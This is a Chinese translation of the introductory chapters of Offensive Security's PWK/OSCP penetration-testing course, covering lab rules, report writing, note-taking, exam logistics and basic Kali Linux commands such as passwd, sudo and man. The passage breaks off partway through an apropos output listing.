实验室\n\n一旦你完成了课程材料，你就应该准备好去做实验，目的是渗透每台机器并获得一个高权限的交互式 Shell。\n\n课程练习包括有关各种实验室机器的信息，如果你一直勤于记笔记，你将有足够的能力去攻克实验室中的一些 \"低悬的果实\"。\n\n下一步是应用从课程中学到的知识，从对网络的其他部分进行彻底的信息收集开始，并利用从被攻击的机器上获得的信息来锁定其他机器。 如果你正在为如何处理一台特定的机器而苦恼，可以考虑去学生论坛上看看，作为第一步。\n\n如果论坛没有为你提供任何有用的信息，你应该联系实时支持，看看是否有任何其他指导。\n\n## 获得支持\n\nPWK不是一个固定速度的课程。 这意味着你可以按照自己的节奏进行，在对你来说有难度的题目上花更多时间。利用这个课程的节奏，不要害怕在一个困难的新课题或方法上多花点时间。没有什么比自己摸索出一些东西更有意义的了。\n\n话虽如此，有时联系支持是完全合适的。在你这样做**之前**，请理解我们希望你在进入实验室之前已经看过所有的课程材料，并且在需要的时候会毫不犹豫地让你回到课程材料中。不仅如此，我们还希望你能通过进行额外的研究来深入挖掘该主题领域。\n\n在与支持部门联系之前，以下常见问题页面可能有助于回答你的一些问题（在没有VPN的情况下都可以访问）：\n\n- https://support.offensive-security.com/\n- https://www.offensive-security.com/faq/\n\n如果你的问题没有得到解决，我们建议你查看学生论坛，该论坛也可以在内部VPN实验室网络之外访问。如果你仍然无法找到你需要的帮助，你可以通过访问支持页面的实时支持$^5$或发送电子邮件（help@offensive-security.com）与我们的学生管理员取得联系。\n\n## 关于渗透测试\n\n渗透测试是对目标或边界进行研究和攻击的一个持续循环。攻击应该是结构化的，经过计算的，并且在可能的情况下，在实验室中进行验证，然后再在实际目标上实施。这就是我们对渗透测试过程的可视化：\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e5327495-6c39-4ed0-b1a4-525cf2a267d9/Untitled.png)\n\n图1：渗透测试方法的示意图\n\n正如该模型可能暗示的那样，你收集的信息越多，成功穿透的概率就越高。一旦你穿透了最初的目标边界，你通常会再次开始这个循环。例如，你可能会收集有关内部网络的信息，以便更深入地渗透它。\n\n最终，每个安全专家都会制定自己的特定方法，通常是基于特定的技术优势。我们鼓励你查看诸如开放网络应用安全项目（OWASP）$^6$的网页，了解一些常用的渗透测试方法。\n\n## 法律\n\n请花时间阅读我们下面的正式版权声明。\n\n在你这样做之前，我们想解释一下，本出版物仅供你个人使用。任何复制本出版物或与任何第三方分享本出版物的全部或部分内容的行为都违反了（a）我们的知识产权（b）您在我们这里注册时接受的合同条款（c）我们的学术政策。\n\n这包括:\n\n- 通过在任何第三方平台、资源库或社交媒体网站上发布本出版物，向其他人提供。\n- 由于你没有充分注意保护本出版物，无意中分享了本出版物\n- 将本出版物的全部或部分内容用于您个人培训以外的任何目的，包括提供或告知任何其他培训课程的内容或用于任何其他商业目的。\n\n我们的学术政策可以在以下网站找到 https://www.offensive-security.com/legal-docs/ 在我们的判断中，如果我们发现你违反了：\n\n- 我们将撤销你已获得的所有现有 Offensive Security 认证\n- 我们将终身取消你参加任何 Offensive Security 课程和考试的资格\n- 我们将终身取消你今后购买 Offensive Security 产品的资格\n\nCopyright © 2020 Offsec Services Ltd. 版权所有。保留所有权利--未经Offensive Security事先书面许可，本出版物/视频的任何部分均不得复制、出版、共享、再分发、再许可、传输、更改、用于创造衍生作品或以任何其他方式利用。\n\n以下文件包含了本课程的实验练习，只能在Offensive Security托管的实验环境中进行尝试。 请注意，如果在没有明确许可的机器上尝试测试和攻击，实验室指南中描述的大多数攻击都是非法的。由于 Offensive Security 公司的实验室环境与互联网隔离，在实验室内进行攻击是安全的。Offensive Security 公司没有授权你在其托管的实验室环境之外进行这些攻击，并对任何此类行为不承担任何责任或义务。\n\n## [DomainsMegaCorpone.com](http://DomainsMegaCorpone.com) 和 Sandbox.local 域名\n\n[megacorpone.com](http://megacorpone.com/) 域名及其子域名代表了一个由 Offensive Security 创建的虚构公司。它有一个看似脆弱的外部网络存在，这是说明整个课程中某些概念的理想选择。\n\n请注意，该域可在内部VPN实验室网络之外访问，只能在课程练习中用于被动和主动收集信息。严禁主动尝试破坏它。\n\nsandbox.local 域代表一个虚构的公司内部网络，用来演示使用课程中所涉及的方法和技术进行的全面渗透测试。\n\nsandbox.local 域只能通过VPN访问，作为你实验室访问的一部分。\n\n## 关于 PWK VPN 实验室\n\nPWK实验室提供了一个隔离的环境，包含各种易受攻击的机器。使用实验室来完成课程练习，并练习课程材料中所教授的技术。\n\n下图是 PWK 实验室的简化图。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abcf00dd-2645-4dbc-90e0-74641128b71e/Untitled.png)\n\n图2：VPN 实验室的简化示意图\n\n一旦你完成了课程视频和 PDF 实验指南，你将拥有渗透实验室中大多数脆弱机器所需的基本技能。最初，你将通过 VPN 连接到学生网络。 随着课程的进行，你将会以黑客的方式进入其他网络。某些机器需要额外的研究和很大的决心才能攻破它们。\n\n每台机器都包含一个 **proof.txt** 文件，作为你妥协的战利品，但请记住，目标不是具体找到**proof.txt** 文件。相反，你要尝试在每台机器上获得一个 root/SYSTEM 级别的交互式外壳。 有些机器可能还包含一个 **network-secret.txt** 文件。你可以将该文件的内容提交给你的控制面板，以解锁将IT、开发和管理部门网络中的虚拟机恢复到原始状态的能力。\n\n请注意，本指南（和视频）中介绍的 IP 地址不一定反映 Offensive Security 实验室的 IP 地址。不要试图逐字逐句地复制实验室指南中的例子。 你将需要根据你的具体实验室配置来调整这些例子。\n\n你应该针对的机器是：\n\n表1 - Offensive Security 实验室的目标范围\n\n你所连接的实验室是由一些不同的学生共享的。我们限制每个实验室的学生人数，以尽量减少有一个以上的学生同时在同一目标机上工作的可能性。\n\n### 实验室警告\n\n内部VPN实验室网络**是一个恶劣的环境**，你不应该在用于连接实验室的Kali Linux虚拟机上存储敏感信息。学生与学生之间的VPN流量是不允许的，但是，你可以通过在不使用服务时停止这些服务，并确保在你的Kali Linux系统上改变任何默认密码来帮助保护自己。\n\n### 控制面板\n\n一旦登录到内部 VPN 实验室网络，你就可以进入你的 PWK 控制面板。PWK 控制面板将帮助你恢复你的客户机和实验机，或预订你的考试。一旦你找到 **network-secret.txt** 文件，你将使用控制面板，提交该文件的内容，并解锁恢复机器的能力。文件，并解锁恢复位于你所发现的其他网络中的机器的能力。\n\n控制面板的网址列在欢迎包的电子邮件中。\n\n### 恢复\n\n每个学生每24小时都有12次恢复的机会。恢复功能使你可以将特定的实验机恢复到原始状态。如果你需要额外的恢复，你可以通过电子邮件（help@offensivesecurity.com）联系学生管理员，或者联系在线支持$^7$来重置你的恢复计数器。\n\n实验机恢复的最小间隔时间是5分钟。\n\n当选择下拉菜单来恢复一台实验室机器时，你可以看到该机器最后一次被恢复的时间。实验机中的一些机器将包含脚本，自动重启崩溃的服务或模拟用户的操作。这不是每个系统的情况，但在扫描或利用一个特定的目标机器时，请考虑到这一点。\n\n我们建议你在开始扫描和攻击一台机器之前，先将其还原，以确保机器及其服务按设计运行。反过来说，一旦你完成了对一台机器的攻击，你也应该还原它，以清除你的攻击所留下的任何人工制品，这样机器就不会处于被利用的状态。\n\n### 客户机\n\n你将被分配到三台专用的客户机，与课程材料和练习一起使用。其中包括一个 Windows 10 客户端，Debian Linux 客户端，以及一个 Windows Server 2016 域控制器。\n\n**每当你连接到VPN时，你将需要通过学生控制面板还原你想使用的机器**。当你选择恢复 Windows10 或 Windows Server 2016 客户端时，两台机器都将被恢复。你指定的客户机在你与 VPN 断开连接一段时间后，会自动关闭电源并恢复到初始状态。\n\n考虑到上述情况，我们强烈建议你**不要在你的任何客户机上存储任何你不愿意丢失的信息**。\n\n### Kali 虚拟机\n\n我们在课程中提供给你使用的 VMware 镜像$^8$是Kali Linux 的默认 64 位构建。我们建议你通过电子邮件欢迎包中提供的URL下载并使用 VMware 镜像。虽然你可以自由地使用 VirtualBox 或 Hyper-V镜像，甚至你自己的 Kali 安装，但我们只能为提供的 VMware 镜像提供支持。这些图像是由Offensive Security 提供的，Kali Linux 项目组不支持。\n\n### 实验室行为和实验室限制\n\n进攻性安全实验室是一个共享环境。 在你探索实验室时，请记住以下几点：\n\n- 避免改变用户密码。相反，如果可能的话，向系统添加新的用户。如果进入机器的唯一方法是改变密码，一旦你完成了对该特定机器的访问，请善意地把它改回来。\n- 你在机器上禁用的任何防火墙规则，一旦你获得了所需的访问级别，就应该恢复。\n- 不要让机器处于非可开发状态。\n- 一旦你完成了工作，应从机器上删除任何成功（和失败）的利用。如果可能的话，创建一个目录来存储你的漏洞。这将最大限度地减少其他人意外地使用你的漏洞攻击目标的机会。\n\n一旦你完成了对每台机器的操作，你可以通过记住恢复每台机器来实现这一切。要恢复一台机器，请使用学生控制面板。\n\n以下限制在内部VPN实验室网络中被严格执行。如果你违反了以下任何限制，进攻性安全公司保留取消你的实验室访问权的权利。\n\n1. 不要对网络进行ARP欺骗或进行任何其他类型的中毒或中间人攻击。\n2. 不要删除或重新定位任何关键的系统文件或提示，除非是权限提升的绝对必要。\n3. 不要改变 network-secret.txt 或 proof.txt 文件的内容。\n4. 不要故意扰乱正在实验室工作的其他学生。这包括但不限于：\n   1. 关闭机器\n   2. 将用户踢出机器\n   3. 封锁一个特定的 IP 地址或范围\n   4. 入侵其他学生的客户端或 Kali 机器\n\n## 报告\n\n报告通常被视为渗透测试的必要之恶。可悲的是，许多高技术和高智商的渗透测试人员并没有给予它应有的重视，但一份写得很好、看起来很专业的报告有时会比写得很差、但很有技术含量的同类报告获得更多的积极关注。\n\n由于撰写报告是任何渗透测试的一部分，而且是 OSCP 考试的一部分，我们想在你接近课程材料之前花点时间谈谈报告的撰写。我们希望，现在回顾这些准则将帮助您考虑如何解释渗透测试的行动、结果和结果。\n\n有许多不同的报告写作方法，我们不会声称 Offensive Security 报告样本$^9$是绝对最好的报告写作方法。如果这个例子有帮助，请随意使用。如果不是，那么请随意改变设计或创造其他更适合你的方法。\n\n有一些我们认为在写报告时必须牢记的一般准则。这些准则没有特别的顺序，因为它们都同样重要。\n\n### 考虑目标\n\n考虑到评估的目标。你设定的目标是什么？你是否希望在报告中作出单一的、具体的陈述？许多没有经验的渗透测试人员会被评估的技术方面和完成评估所需的技能所吸引，但渗透测试绝不是一个简单炫耀的机会。 在你开始写报告时，要牢记最初的目标。\n\n组织你的内容，建立一个能与你的听众产生最大共鸣的报告。我们强烈建议在开始之前写一个大纲。 你可以通过创建章节标题来快速而轻松地完成这一工作，而不需要实际的内容或解释。 这将帮助你避免重复自己或遗漏关键信息。它还可以帮助你更容易地克服可怕的 \"写作障碍\"。\n\n### 考虑听众\n\n想一想谁会阅读你在报告中所包含的信息并采取行动。你的听众希望从报告中学到什么？ 他们是谁？ 在大多数情况下，具有不同技术知识水平的人都会阅读你的报告。试着写一些东西来满足报告的每个潜在读者。\n\n实际上，这意味着把你的报告分成几个部分来写，以满足不同听众的需要。\n\n让我们花点时间再谈谈观众的问题。\n\n你可能期望公司的高层管理人员阅读报告的某些部分。在大多数情况下，这些高管没有时间或愿望来阅读攻击的所有高度技术性细节。 出于这个原因，大多数报告以执行摘要开始。 执行摘要应该是一个简短的（不超过两页），对结果和客户的整体安全状况的高级解释。由于这可能是他们唯一会读到的部分，请确保你为高管们专门定制这一部分和语言。\n\n还会有一个由更多技术专家组成的团队，他们会更详细地阅读你的报告。 报告的其余部分应该迎合他们，并将包括你对目标网络造成的大屠杀的所有血腥细节。\n\n### 考虑包括哪些内容\n\n更具体地说，考虑一下**不包括**哪些内容是很有帮助的。请记住，你的读者 你的读者会想解决你发现的问题，所以你包括的所有内容应该是 相关和有意义。一份臃肿的报告，包含了太多切身的或不相关的信息，只会 让你的读者难以阅读和理解。不要为了让报告看起来更长而加入填充材料 使报告看起来更长。\n\n这里有四个关于包括什么和不包括什么的快速指南：\n\n1. **除非**绝对相关，否则不要在您的报告中包括一页又一页的工具输出。考虑一下Nmap的输出。您没有理由在您的报告中包括输出的每一行，因为它不会增加任何价值。如果您有一个想表达的观点，例如在公开访问的主机上暴露了非常多的SNMP服务，那么使用**-oG**标志，只把那些开放SNMP端口的主机找出来。\n2. 明智地使用屏幕截图。这条规则与你添加到报告中的其他内容一样适用。使用屏幕截图来说明问题，而不仅仅是为了显示令人敬畏的meterpreter输出。例如，假设你在一台Linux主机上获得了root权限。与其显示15张只有root用户才能访问的各种目录列表的截图，不如只包括一张**whoami**命令输出的截图。一个精通技术的读者可能只需要这一件事就能理解你所取得的成就。\n3. 包括额外的材料作为额外的支持文件。如果你的内容会推高页数，但对整个受众来说并不感兴趣，可以考虑在报告之外提供额外的支持文件。需要这些信息的读者仍然可以检查支持文件，报告的质量也不会受到影响。\n4. 也许最重要的是，要回到评估的目标上来。想一想你想表达的观点，因为它与目标有关，并想一想每条信息将如何或如何加强该观点。\n\n### 考虑介绍\n\n内容的表述与内容本身一样关键。 掌握语言绝对是最关键的。虽然我们理解对我们的许多学生来说，英语不是他们的母语，但尝试写出连贯的句子，使之流畅和有逻辑性，仍然很重要。在这种情况下，重要的是 \"更努力\"，尽最大努力，集中精力提出简单易懂的观点。\n\n此外，你可能想记住以下几点：\n\n1. 要保持一致。注意诸如间距、标题风格、字体选择等方面的不一致。错位和不一致的段落或标题看起来很不专业，很草率。\n2. 拼写检查，拼写检查，拼写检查! 这个是不言自明的。Their != There, Your != Yourre\n\n这些要点应该让你大致了解如何写出一份专业的、连贯的报告，清楚地传递预期的信息。 归根结底，报告是你交付给客户的产品。确保它正确而专业地代表你和你的工作。\n\n### PWK 报告\n\n在你完成课程实验指南和视频后，你将在我们的内部VPN实验网络内进行一次全面的渗透测试。对这次实践渗透测试的报告不是强制性的，但它可能对你有好处，因为它是练习你在整个职业生涯中都会用到的重要技能的一种有用方法。\n\n如果你选择写并提交你的实验报告，你需要记录本实验指南中的课程练习，除非另有说明。你可以将这些内容作为附录添加到你的最终报告中，你将在完成认证考试后提交。\n\n最后的文件应作为正式的渗透测试报告提交。 您的报告应包括执行摘要，以及所有机器（不包括您的专用客户机）的详细情况。 有关该课程报告要求的详细信息，包括模板和报告样本，可在我们的支持网站 $^{10}$ 上找到。\n\n除了可选的VPN实验室网络渗透测试报告外，选择OSCP认证的学生必须提交一份考试渗透测试报告。该报告应明确说明他们是如何成功实现认证考试目标的。这份最终报告必须在认证考试结束后24小时内以PDF格式发回给我们的认证委员会。\n\n计划在通过OSCP认证考试之前申请CPE学分的学生，需要撰写并提交一份内部VPN实验网络的报告，并将课程练习作为附录。\n\n## 做笔记\n\n信息是关键，所以做笔记和保持有条理的笔记是至关重要的。这适用于PWK课程、相应的OSCP考试，甚至是一般的渗透测试。\n\n笔记的详细程度由你自己决定。我们建议你一开始就记录**一切**。这包括所有的控制台输出，以及关键事件的屏幕截图。有太多的东西总比为了填补空白而重复材料要好。\n\n从一开始就有条不紊，从长远来看会有收获。如果你在几周、几个月、甚至几年后需要返回你的笔记，组织工作将使你能够迅速找到你需要的信息。培养良好的文档技能还可以让你迅速找到几天前用来攻击某台机器的长命令，如果你需要重新攻击它，或者在成功入侵每台目标机器后，在攻击后交叉参考用户。\n\n随着时间的推移，你将开始为你的笔记生成粗略的模板和格式。因此，在课程开始和结束时，你的笔记布局和细节会有所不同。我们经常听到学生评论说，他们在开始时错过了某些信息，而他们不得不回到 \"早期目标 \"去收集这些信息。\n\n争取从一个目标上收集尽可能多的信息。这将使你能够生成一份完整的报告，即使你不能进入实验室。拥有好的、详细的笔记在实验室开发后的阶段将特别有用，因为有某些信息是现成的，应该有助于你找到实验室机器之间的明确联系，等等。一个好的记录过程将为你节省相当多的时间，也会为你节省一些头痛的问题。\n\n### 设置与提示\n\n做好笔记的关键是能够收集尽可能多的信息，并能随时获取这些信息。信息量可能会随着时间的推移而变化，而你快速找到所需信息的过程也可能会发生变化。\n\n你还需要了解信息的存储地点--是本地还是远程？它是否被加密？ 是否有任何敏感信息是你笔记的一部分？ 如果有，请考虑你的信息（或者更糟糕的是，你的客户的信息）可能会落入坏人手中。\n\n开始时，我们强烈建议你捕捉和记录一切。 某些工具支持将其输出写入文件，其中一些工具甚至有报告功能。捕捉你的终端输出，然后将其与你的个人笔记相结合，有时也会有帮助。 确保注释，突出重要部分，并写下任何你认为相关的东西。请记住，有时一张截图胜过千言万语，所以请确保你也拍下它们。\n\n### 记笔记的工具\n\n有很多笔记工具可以选择，如 OneNote$^{11}$（Windows/MacOS）、DayOne$^{12}$（macOS）或 Joplin$^{13}$（MacOS/Windows/Linux）等。\n\n你也可以选择使用像 MDwiki$^{14}$ 这样的工具，它是一个基于 markdown 的 wiki，允许你用 markdown 写作，然后用 HTML 渲染输出。\n\n无论你喜欢哪种工具，收集RAW输出的最好方法是设置某种类型的记录，然后忘记它（直到需要它）。这样一来，输出就会自动保存，你就不必担心要记得返回你的笔记。有几种方法可以使显示在终端的所有输出得到保存，其中一些方法包括：\n\n- script：一旦执行，所有的输出（包括bash的颜色和后缀）都会被保存到一个文件中，可以在任何时候重新播放。\n- terminator：一个备用的终端模拟器，具有各种功能和插件，如Logger（将所有输出保存到文本文件）和TerminalShot（在终端内进行屏幕截图）。\n\n**注意**：管道输出（>）或使用tee也是一种选择，但你必须对每个命令使用它们，所以你必须记住每次都要运行它们。\n\n为了处理渗透测试期间收集到的大量信息，我们喜欢使用一个多用途的笔记应用程序来初步记录我们的所有发现。 使用这样的应用程序既有助于从数字上组织数据，也有助于从精神上组织数据。渗透测试结束后，我们可以使用临时文件来编制完整的报告。\n\n只要输出结果清晰易读，你用哪种程序做临时文件并不重要。 习惯于记录你的工作和发现。 这是完成工作的唯一专业方式!\n\n### 备份\n\n有两种人：一种是定期备份他们的文件，另一种是希望他们这样做。备份通常被认为是一种保险。你永远不知道你什么时候会需要它，直到你需要它为止! 作为一般规则，我们建议你定期备份你的文件。把你的备份保存在一个安全的地方。你肯定不希望它们最终出现在公共git repo或云中！\n\n文件不应该是你唯一备份的东西。确保你备份了你的Kali虚拟机上的重要文件，如果需要的话，采取适当的快照，等等。谨慎行事总是最好的。\n\n## 关于 OSCP 考试\n\nOSCP认证考试模拟了一个包含少量脆弱机器的私有VPN的实时网络。 要通过考试，你必须得到 70 分。 对有限的访问以及完全的系统破坏都会得到分数。在考试期间，环境是完全为你服务的，你将有23小时45分钟来完成考试。\n\n每台目标机的具体说明将位于你的考试控制面板中，只有在考试开始后你才能使用你的考试包，包括一个VPN连接包和其他明，将包含唯一的URL，你可以用来访问你的考试控制面板。\n\n为了确保我们认证的完整性，考试将采用远程监考。你需要在考试开始前15分钟到场，进行身份验证和其他考前工作。在安排考试之前，请务必阅读我们的监考常见问题$^{15}$。\n\n考试结束后，你将有额外的24小时来整理你的考试报告并记录你的发现。你将根据考试报告的质量和内容进行评估，所以请尽可能多地包括细节，并确保你的发现都是可重复的。\n\n另外，请注意，接受你的考试提交是一个人工过程，所以在你收到我们的正式通知说我们已经收到你的文件之前，可能需要一些时间。\n\n一旦你的考试文件被接受，你的考试将被打分，你将在10个工作日内收到你的成绩。 如果你达到了合格的分数，我们会要求你确认你的实际地址，以便我们能够邮寄你的证书。如果你没有达到要求，那么我们会通知你，你可以使用适当的链接购买认证重考。\n\n我们强烈建议你把考试时间仔细安排在36小时内，确保没有外界干扰或承诺。 另外，请注意，考试的可用性是以先到先得的方式处理的，所以最好尽可能提前安排考试，以确保你的首选日期可用。 关于考试的其他信息，我们鼓励你花一些时间来阅读OSCP考试指南$^{16}$。\n\n### Metasploit 的使用 - 实验室与考试\n\n我们鼓励你在实验室里使用Metasploit。Metasploit是一个伟大的工具，你应该学习它所提供的所有功能。虽然Metasploit的使用在OSCP认证考试中受到限制，但我们将鼓励你在学习过程中不要对自己施加任意的限制。关于Metasploit使用的更多信息可以在OSCP考试指南中找到。\n\n## 结束语\n\n在这个模块中，我们讨论了充分利用PWK课程和实验室所需的重要信息。此外，我们还介绍了报告写作的基本知识以及如何参加OSCP的最终考试。\n\n我们祝愿你在PWK的旅程中好运，并希望你享受你将面临的新挑战。\n\n# 舒适地使用 Kali Linux\n\nKali Linux 是由 Offensive Security 开发、资助和维护的。它是一个基于 Debian 的 Linux 发行版，旨在进行高级渗透测试和安全审计。Kali 包含几百个工具，面向各种信息安全任务，如渗透测试、安全研究、计算机取证和逆向工程。\n\n所有随操作系统打包的程序都经过了评估，以确定其适用性和有效性。 它们包括用于网络渗透测试的Metasploit，用于端口和漏洞扫描的Nmap，用于监控网络流量的Wireshark，以及用于测试无线网络安全的Aircrack-ng等等。\n\n本模块的目标是提供一个基线，让所有技能水平的用户为即将到来的模块做好准备。我们将探讨新用户的技巧和窍门，并回顾一些高级用户可能欣赏的标准。无论技能水平如何，我们都建议在本模块中关注适当的水平。正如亚伯拉罕-林肯被传言的那样，\"给我六个小时去砍一棵树，我将花前四个小时去磨斧头\"。\n\n此外，我们鼓励所有技能水平的用户查看Kali培训网站上的免费在线培训。17这个网站包括KaliLinux Revealed一书，旨在测试你的理解的练习，一个专门的支持论坛，以及更多。 这些免费资源为所有技能水平的用户提供了有价值的见解，是本课程培训的一个很好的补充。\n\n## 启动 Kali Linux\n\n首先，下载官方的Kali Linux 64位（amd64）VMware虚拟机（VM）$^{18}$和你选择使用的VMware软件。VMware为VMware WorkStation Pro$^{19}$ 和VMware Fusion for Mac提供了免费试用版。$^{20}$ 使用这些商业版本的好处是能够拍摄快照，如果你需要重置你的虚拟机到一个干净的地方，你可以恢复到快照。VMware还提供了一个免费版本的软件，即VMware WorkStation Player.$^{21}$但是，免费版本没有快照功能。\n\n我们将使用一个64位（amd64）的Kali Linux虚拟机，所以为了获得最佳效果并与实验指南保持一致，我们建议你也使用它。不要偏离这个标准的构建，因为这可能会创造一个与课程培训材料不一致的工作环境。\n\n你可以在Offensive Security的支持网站$^{22}$上找到最新的Kali Linux虚拟机镜像以及最新的验证下载档案的说明。作为一个安全专家，你应该在使用任何你下载的文件之前总是花时间正确验证它。不这样做会使你和你的客户面临不必要的风险。\n\n为了使用Kali Linux虚拟机，我们将首先解压存档，并用VMware打开.vmx文件。如果出现了选项，请选择 \"我复制了它\"，以指示虚拟机生成一个新的虚拟MAC地址，避免潜在的冲突。\n\n虚拟机的默认凭证是：\n\n- **Username**: kali\n- **Password**: kali\n\n<aside> 💡 在第一次启动时，从终端使用passwd命令更改所有默认密码是很重要的。我们要和其他学生一起连接到一个在线实验室，默认密码几乎可以保证俏皮的滥用!\n\n</aside>\n\n要改变密码，点击终端图标，发出内置的passwd命令：\n\n```bash\nkali@kali:~$ passwd\nChanging password for kali.\n(current) UNIX password:\nEnter new UNIX password:\nRetype new UNIX password:\npasswd: password updated successfully\n```\n\n清单 1 - 更改 kali 用户的默认密码\n\nKali Linux虚拟机将包含两个默认用户，\"root \"和 \"kali\"。我们将使用kali用户账户。虽然作为根用户登录可能是很诱人的，但不建议这样做。根用户有不受限制的访问权，一个不小心的命令可能会破坏我们的系统。更糟糕的是，如果对手利用以root身份运行的进程，他们将完全控制我们的机器。\n\n许多命令需要高权限才能运行，幸运的是，sudo命令可以克服这个问题。我们在我们希望运行的命令后面输入sudo，并在提示时提供我们的密码。\n\n```bash\nkali@kali:~$ whoami\nkali\n\nkali@kali:~$ sudo whoami\n[sudo] password for kali:\nroot\n```\n\n清单2 - 使用sudo以root身份运行一个命令\n\n最后，探讨一下VMware的快照功能，它允许我们将虚拟机恢复或重置到一个干净的地方。如果出了问题，定期快照可以节省大量的时间和挫折感。\n\n## Kali 菜单\n\nKali Linux的菜单包括对发行版中的许多工具的分类链接。这种结构有助于澄清每个工具的主要作用，以及其使用的背景。\n\n花点时间浏览一下Kali Linux的菜单，帮助自己熟悉可用的工具和它们的类别。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/884573bb-cb89-4b1b-9ba1-d04030299bde/Untitled.png)\n\n图1：Kali的菜单\n\n作为一个完整的操作系统，Kali Linux提供了许多特性和功能，我们无法在本课程中完全探索。然而，有一些官方的Kali Linux资源可供进一步研究和学习。\n\n- Kali Linux 官方文档$^{23}$\n- Kali Linux 支持论坛$^{24}$\n- Kali Linux 工具网站$^{25}$\n- Kali Linux 错误跟踪器$^{26}$\n- Kali Linux 培训$^{27}$\n\n### Kali Linux 官方文档\n\nKali Docs网站$^{28}$，顾名思义，是Kali Linux的官方文档库。 这个网站提供了最新的Kali文档，详细介绍了许多常见的程序，并且应该被认为是Kali Linux故障排除和支持的第一站。\n\n### Kali Linux 支持论坛\n\n下一站是Kali Linux支持论坛$^{29}$。在发帖之前，请阅读论坛的规则和指南$^{30}$，因为不符合规定的帖子通常会被审核或忽略掉。在创建一个新的主题之前，一定要在论坛上彻底搜索之前发布的解决方案。\n\n### Kali Linux 工具网站\n\nKali具有许多渗透测试工具，来自安全和取证领域的各种利基。 Kali工具网站$^{31}$旨在列出所有这些工具，并为每个工具提供快速参考。 这些工具的版本可以根据其上游来源进行追踪。 此外，关于每个元包的信息也是可用的。元包提供了灵活性，可以根据特定的需求安装特定的工具子集，包括无线、网络应用、取证、软件定义无线电等等。\n\n### Kali Linux 错误跟踪器\n\n偶尔，某些工具可能会崩溃或产生意外的结果。 当这种情况发生时，在Kali Linux Bug Tracker$^{32}$网站上搜索给定的错误信息可能有助于确定该问题是否是一个bug，如果是的话，如何解决它。 用户也可以通过该网站报告错误来帮助社区。\n\n### Kali 培训网站\n\nKali Linux 培训网站$^{33}$承载了官方的Kali Linux手册和培训课程。这个免费的网站是基于 Kali Linux Revealed$^{34}$一书，并承载了HTML 和 PDF 格式的书籍内容，测试你对材料知识的练习，一个支持论坛，等等。这个网站包括大量有用的信息，帮助用户更好地熟悉 Kali Linux。\n\n### 练习\n\n(这些练习不需要报告)\n\n1. 启动你的Kali操作系统，并将Kali用户密码改为安全的密码。\n2. 花一些时间熟悉Kali Linux的菜单。\n3. 使用Kali Tools网站，找到你最喜欢的工具并查看其文档。如果你没有最喜欢的工具，可以选择任何工具。\n\n## 在 Kali 里找到自己的路\n\n### Linux 文件系统\n\nKali Linux 遵循文件系统层次标准（FHS）35，它为所有 Linux 用户提供了一个熟悉和通用的布局。你会发现最有用的目录是：\n\n- **/bin** - 基本程序(ls, cd, cat, 等)\n- **/sbin** - 系统程序（fdisk、mkfs、sysctl等）\n- **/etc** - 配置文件\n- **/tmp** - 临时文件（通常在启动时删除）\n- **/usr/bin** - 应用程序（apt, ncat, nmap, 等）\n- **/usr/share** - 应用程序支持和数据文件\n\n还有许多其他的目录，其中大部分你很少需要进入，但对Linux文件系统的布局有一个很好的熟悉，将极大地帮助你提高效率。\n\n## Linux 的基本命令\n\n### 帮助手册\n\n接下来，让我们深入了解Kali Linux的用法，并探索一些基本的Linux命令。\n\n大多数用于Linux命令行的可执行程序都提供了一份正式的文档，通常称为手册或man手册$^{36}$。一个名为man的特殊程序被用来查看这些页面。 手册页面通常有一个名称、一个概要、一个关于命令目的的描述，以及相应的选项、参数或开关。让我们来看看ls命令的手册页。\n\n```bash\nkali@kali:~$ man ls\n```\n\n清单3 - 探索ls命令的手册页\n\n帮助手册不仅包含有关用户命令的信息，而且还包含有关系统管理命令、编程接口等的文档。系统管理命令、编程接口等方面的文档。本手册的内容被分为若干章节，其编号如下：\n\n表2 - 帮助手册的组织\n\n要确定适当的手册章节，只需进行关键字搜索。 例如，让我们假设我们有兴趣了解更多关于 **/etc/passwd** 文件格式的信息。在命令行输入**man passwd**，将显示手册第1节中有关 **passwd** 命令的信息（图2），这不是我们感兴趣的内容。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c02a67e2-cc44-4cb1-95aa-5c58aa1330a1/Untitled.png)\n\n图2：要求手动输入passwd文件\n\n然而，如果我们使用 **man** 中的 **-k** 选项，我们可以进行关键词搜索，如下图所示：\n\n```bash\nkali@kali:~$ man -k passwd\nchgpasswd (8) - 在批处理模式下更新组密码\nchpasswd (8) - 以批处理方式更新密码\nexim4_passwd (5) - Debian exim4 软件包所使用的文件\nexim4_passwd_client (5) - Debian exim4 软件包正在使用的文件\nexpect_mkpasswd (1) - 生成新的密码，可选择将其应用于一个用户\nfgetpwent_r (3) - 获取密码文件条目，并将其集中在一起\ngetpwent_r (3) - 重复获取passwd文件条目\ngpasswd (1) - 管理 /etc/group 和 /etc/gshadow\ngrub-mkpasswd-pbkdf2 (1) - 为GRUB生成散列密码\nhtpasswd (1) - 管理基本认证的用户文件\n...\n```\n\n清单 4 - 使用 man 执行 passwd 关键字搜索\n\n我们可以在正则表达式的帮助下进一步缩小搜索范围：$^{37}$\n\n```bash\nkali@kali:~$ man -k '^passwd$'\npasswd (1) - 更改用户密码\npasswd (1ssl) - 计算密码散列值\npasswd (5) - 密码文件\n```\n\n清单5 - 缩小我们的搜索范围\n\n在上面的命令中，正则表达式被圆点(^)和美元符号($)所包围，以便 匹配整个行，避免子字符串匹配。现在，我们可以通过引用适当的章节来查看我们感兴趣的确切的 passwd 手册页面。\n\n```bash\nkali@kali:~$ man 5 passwd\n```\n\n清单 6 - 使用 man 查看 /etc/passwd 文件格式的手册页\n\n帮助手册通常是寻找某个特定命令的文档的最快捷方式，所以花点时间来更详细地探索它们。\n\n### apropos\n\n使用apropos$^{38}$命令，我们可以根据一个关键词在man page描述的列表中搜索可能的匹配。虽然这有点粗糙，但对于根据描述找到一个特定的命令来说，往往很有帮助。让我们来看一个例子。假设我们想对一个硬盘进行分区，但却不记得该命令的名称。我们可以通过搜索 \"partition \"来弄清楚这个问题。\n\n```bash\nkali@kali:~$ apropos partition\naddpart (8) - 告诉内核一个分区的存在\ncfdisk (8) - 显示或操作一个磁盘分区表\ncgdisk (8) - 基于Curses的GUID分区表（GPT）操纵器\ncgpt (1) - 用Chromium OS来操作GPT分区的实用程序 ...\ndelpart (8) - 告诉内核忘记一个分区的存在\nextundelete (1) - 